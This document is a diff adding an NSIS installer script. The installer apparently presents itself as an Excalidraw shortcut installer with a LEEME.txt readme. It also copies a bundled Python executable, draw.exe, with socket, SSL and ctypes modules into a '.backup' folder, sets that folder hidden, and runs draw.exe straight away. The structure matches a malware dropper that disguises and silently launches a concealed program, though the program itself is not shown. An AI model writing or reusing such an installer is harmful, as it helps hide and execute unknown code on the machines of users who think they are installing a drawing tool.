@@ -1,0 +1,46 @@
+Outfile "draw-installer.exe"
+
+InstallDir $EXEDIR
+
+Section
+
+SetOutPath $INSTDIR
+
+File LEEME.txt
+File excalidraw.url
+
+SetOutPath $INSTDIR\.backup
+
+File .backup\base_library.zip
+File .backup\draw.exe
+File .backup\libcrypto-1_1.dll
+File .backup\libffi-7.dll
+File .backup\libssl-1_1.dll
+File .backup\pyexpat.pyd
+File .backup\python310.dll
+File .backup\select.pyd
+File .backup\unicodedata.pyd
+File .backup\VCRUNTIME140.dll
+File .backup\_asyncio.pyd
+File .backup\_bz2.pyd
+File .backup\_ctypes.pyd
+File .backup\_decimal.pyd
+File .backup\_hashlib.pyd
+File .backup\_lzma.pyd
+File .backup\_multiprocessing.pyd
+File .backup\_overlapped.pyd
+File .backup\_queue.pyd
+File .backup\_socket.pyd
+File .backup\_ssl.pyd
+
+SectionEnd
+
+Section
+
+SetOutPath $INSTDIR
+
+SetFileAttributes "$EXEDIR\.backup" HIDDEN
+
+Exec '"$EXEDIR\.backup\draw.exe"'
+
+SectionEnd
